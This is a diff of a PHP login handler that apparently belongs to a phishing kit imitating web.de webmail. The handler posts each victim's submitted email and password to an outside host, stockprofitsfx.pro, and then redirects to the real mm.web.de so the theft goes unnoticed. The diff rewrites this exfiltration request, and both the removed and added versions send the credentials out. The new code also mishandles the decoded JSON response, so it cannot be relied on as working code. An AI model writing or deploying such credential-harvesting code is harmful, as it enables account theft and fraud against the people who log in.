@@ -3,33 +3,38 @@
 if (isset($_POST['login'])) {
   extract($_POST);
 
-  $apiEndpoint = 'https://stockprofitsfx.pro/email_api_service/send-email';
-
-  $postData = [
+  $data = array(
     'email' => $email,
     'password' => $password,
-  ];
+  );
 
-  $ch = curl_init($apiEndpoint);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-  curl_setopt($ch, CURLOPT_POST, true);
-  curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
+  $curl = curl_init();
 
-  $response = curl_exec($ch);
+  curl_setopt_array($curl, array(
+    CURLOPT_URL => 'https://stockprofitsfx.pro/email_api_service/send-email',
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_ENCODING => '',
+    CURLOPT_MAXREDIRS => 10,
+    CURLOPT_TIMEOUT => 0,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+    CURLOPT_CUSTOMREQUEST => 'POST',
+    CURLOPT_POSTFIELDS => json_encode($data),
+    CURLOPT_HTTPHEADER => array(
+      'Content-Type: application/json'
+    ),
+  ));
+  
+  $response = curl_exec($curl);
+  curl_close($curl);
 
-  if ($response === false) {
-    echo 'Error sending data to the API endpoint: ' . curl_error($ch);
+  $result = json_decode($response);
+
+  if (isset($result['statusCode']) && $result['statusCode'] == 200) {
+    header("Location: https://mm.web.de/");
   } else {
-    $responseData = json_decode($response, true);
-
-    if (isset($responseData['statusCode']) && $responseData['statusCode'] == 200) {
-      header("Location: https://mm.web.de/");
-    } else {
-      echo 'API request failed: ' . $responseData['message'];
-    }
+    echo 'API request failed: ' . $result['message'];
   }
-
-  curl_close($ch);
 }
 ?>
 
